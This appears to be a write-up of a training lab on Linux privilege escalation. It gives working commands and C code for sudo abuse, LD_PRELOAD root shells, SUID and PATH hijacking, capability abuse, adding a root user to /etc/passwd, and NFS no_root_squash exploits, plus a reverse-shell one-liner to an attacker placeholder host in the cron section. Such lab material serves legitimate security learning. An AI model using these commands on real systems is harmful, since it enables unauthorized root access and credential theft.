# Linux Privilege Escalation: Basics

**Room:** Linux Privilege Escalation: Basics
**Date:** June 30, 2026

---

## 1. Basic Sudo Escalation

Check current sudo privileges for the current user:

```bash
sudo -l
```

If a binary like `/bin/cat` is allowed without a password, it can be used to read sensitive files:

```bash
sudo cat /etc/shadow
```

---

## 2. Leverage Application Functions (Apache2)

Some applications expose features that can be abused to leak sensitive data. Apache2 supports loading an alternate config file with the `-f` flag:

```bash
sudo apache2 -C "LoadModule mpm_event_module /usr/lib/apache2/modules/mod_mpm_event.so" -f /etc/shadow
```

This causes an error that leaks the first line of `/etc/shadow` (the root hash), which can then be cracked offline.

---

## 3. LD_PRELOAD Privilege Escalation

**Condition:** `env_keep+=LD_PRELOAD` must be present in `sudo -l` output.

**Steps:**

1. Write a malicious shared library in C (`shell.c`):

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

2. Compile it as a shared object:

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

3. Run any sudo-allowed binary with the preloaded library:

```bash
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```

This spawns a root shell.

---

## 4. SUID / SGID Binaries

Find all files with SUID or SGID bits set:

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

Cross-reference results with [GTFOBins](https://gtfobins.github.io) (filter by **SUID**) to find exploitable binaries.

### Using nano (SUID) to Escalate

If `nano` has the SUID bit set, you can read and write privileged files.

**Option A — Read `/etc/shadow` and crack offline:**

```bash
nano /etc/shadow
unshadow passwd.txt shadow.txt > passwords.txt
```

**Option B — Add a root user to `/etc/passwd`:**

Generate a password hash:

```bash
openssl passwd -1 -salt THM password1
```

Append a new root-level entry to `/etc/passwd`:

```
hacker:$1$THM$WnbwlliCqxFRQepUTCkUT1:0:0:root:/root:/bin/bash
```

Then switch to the new user:

```bash
su hacker
```

---

## 5. PATH Hijacking

**Condition:** A SUID binary calls a command using a relative path (e.g., `system("thm")`).

1. Find writable directories:

```bash
find / -type d -writable 2>/dev/null | sort -u
```

2. Add a writable directory (e.g., `/tmp`) to `$PATH`:

```bash
export PATH=/tmp:$PATH
```

3. Create a malicious script in that directory:

```bash
echo "/bin/bash" > /tmp/thm
chmod 777 /tmp/thm
```

4. Run the SUID binary — it will execute your script as root:

```bash
./program
```

---

## 6. Capabilities

List binaries with elevated Linux capabilities:

```bash
getcap -r / 2>/dev/null
```

The capability `cap_setuid+ep` allows a binary to change its UID to root. If a binary like `vim` has this set, exploit it:

```bash
./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

> Note: Capabilities-based escalation is **not detectable** via SUID scans.

---

## 7. Cron Job Exploitation

Read system-wide cron jobs:

```bash
cat /etc/crontab
```

Other cron locations to check:

| Path | Description |
|------|-------------|
| `/etc/cron.d/` | Package drop-in cron fragments |
| `/etc/cron.hourly/` | Hourly scripts |
| `/etc/cron.daily/` | Daily scripts |
| `/etc/cron.weekly/` | Weekly scripts |
| `/etc/cron.monthly/` | Monthly scripts |
| `/var/spool/cron/crontabs/` | Per-user crontabs |

**Exploit:** If a root-owned cron job runs a script you can write to, replace it with a reverse shell:

```bash
bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1
```

Or reset the root password directly:

```bash
echo "root:newpass" | chpasswd
```

Start a listener on the attacker machine:

```bash
nc -nlvp <PORT>
```

---

## 8. NFS No Root Squash

Read NFS export config:

```bash
cat /etc/exports
```

Look for `no_root_squash` on writable shares. Enumerate shares remotely:

```bash
showmount -e <TARGET_IP>
```

Mount the share on your attacker machine:

```bash
mkdir /tmp/nfsmount
mount -o rw <TARGET_IP>:/share /tmp/nfsmount
```

Compile a SUID root shell on the mounted share:

```c
int main() {
    setgid(0);
    setuid(0);
    system("/bin/bash");
    return 0;
}
```

```bash
gcc nfs.c -o nfs -w -static
chmod +s nfs
```

Run the binary on the target to get a root shell:

```bash
./nfs
```

---

## Quick Reference — Key Commands

| Technique | Command |
|-----------|---------|
| Check sudo rights | `sudo -l` |
| Find SUID/SGID files | `find / -type f -perm -04000 -ls 2>/dev/null` |
| Find writable dirs | `find / -type d -writable 2>/dev/null` |
| List capabilities | `getcap -r / 2>/dev/null` |
| Read crontab | `cat /etc/crontab` |
| Read NFS exports | `cat /etc/exports` |
| List NFS shares | `showmount -e <IP>` |
| Generate password hash | `openssl passwd -1 -salt <SALT> <PASSWORD>` |
| Unshadow for cracking | `unshadow passwd.txt shadow.txt > passwords.txt` |

---

*Reference: [GTFOBins](https://gtfobins.github.io) for exploitable binaries.*
